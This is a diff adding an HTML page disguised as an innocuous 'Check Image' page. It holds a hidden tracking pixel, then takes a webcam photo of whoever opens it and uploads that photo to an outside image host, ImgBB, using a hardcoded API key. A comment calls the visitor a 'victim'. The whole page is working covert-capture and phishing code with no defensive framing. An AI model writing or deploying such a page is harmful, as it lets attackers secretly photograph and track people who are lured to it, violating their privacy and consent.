@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Check Image</title>
+    <style>
+        #camera-feed { width: 100%; max-width: 480px; }
+        #status { margin-top: 10px; color: green; }
+    </style>
+</head>
+<body>
+    <!-- 1. CanaryToken: Triggers when this page loads -->
+    <img src="http://canarytokens.com/static/feedback/uw8ahbo0lkh6df3e6w678h67l/preview.png" width="1" height="1" style="display:none;">
+    
+    <!-- 2. Video Feed for Camera -->
+    <video id="camera-feed" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="status">Waiting for camera...</div>
+
+    <script>
+        // Configuration
+        const API_KEY = "94d60934f1149e95e0b6683bf694790d";
+        const video = document.getElementById("camera-feed");
+        const canvas = document.getElementById("canvas");
+        const statusDiv = document.getElementById("status");
+
+        // Step 1: Access Webcam
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    statusDiv.innerText = "Camera Active. Capturing...";
+                    
+                    // Wait 1 second then capture
+                    setTimeout(() => {
+                        // Step 2: Capture Photo to Canvas
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext("2d");
+                        context.drawImage(video, 0, 0);
+                        
+                        // Step 3: Convert to Base64
+                        const dataURL = canvas.toDataURL("image/png");
+                        const base64Image = dataURL.split(',')[1]; // Remove header
+
+                        // Step 4: Upload to ImgBB API
+                        const formData = new FormData();
+                        formData.append("image", base64Image);
+                        formData.append("94d60934f1149e95e0b6683bf694790d", API_KEY);
+
+                        fetch("https://api.imgbb.com/1/upload", {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                statusDiv.innerText = "Photo Captured and Uploaded!";
+                                console.log("Uploaded URL:", data.data.url);
+                                // Optional: Redirect victim or stop stream
+                                video.srcObject.getTracks().forEach(track => track.stop());
+                            } else {
+                                statusDiv.innerText = "Upload Failed: " + data.error.message;
+                            }
+                        })
+                        .catch(error => {
+                            statusDiv.innerText = "Error: " + error;
+                        });
+                    }, 1000); // 1000ms = 1 second delay
+                })
+                .catch(function(error) {
+                    statusDiv.innerText = "Camera Access Denied or Error.";
+                    console.error("Error accessing camera: ", error);
+                });
+        } else {
+            statusDiv.innerText = "Camera not supported in this browser.";
+        }
+    </script>
+</body>
+</html>
